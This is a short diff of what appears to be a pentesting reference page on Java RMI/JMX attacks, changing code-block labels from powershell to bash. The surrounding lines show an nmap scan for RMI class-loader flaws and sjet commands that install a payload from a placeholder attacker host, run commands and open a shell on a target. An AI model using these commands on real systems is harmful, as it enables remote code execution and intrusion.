@@ -17,7 +17,7 @@ description = 'All about Java RMI techniques, methods, payloads, how/why/when th
 
 ### Detection
 
-```powershell
+```bash
 $ nmap -sV --script "rmi-dumpregistry or rmi-vuln-classloader" -p TARGET_PORT TARGET_IP -Pn -v
 1089/tcp open  java-rmi Java RMI
 | rmi-vuln-classloader:
@@ -41,7 +41,7 @@ The attack involves the following steps:
 
 Exploit the JMX using [sjet](https://github.com/siberas/sjet) or [mjet](https://github.com/mogwailabs/mjet)
 
-```powershell
+```bash
 jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000
 jython sjet.py TARGET_IP TARGET_PORT super_secret command "ls -la"
 jython sjet.py TARGET_IP TARGET_PORT super_secret shell
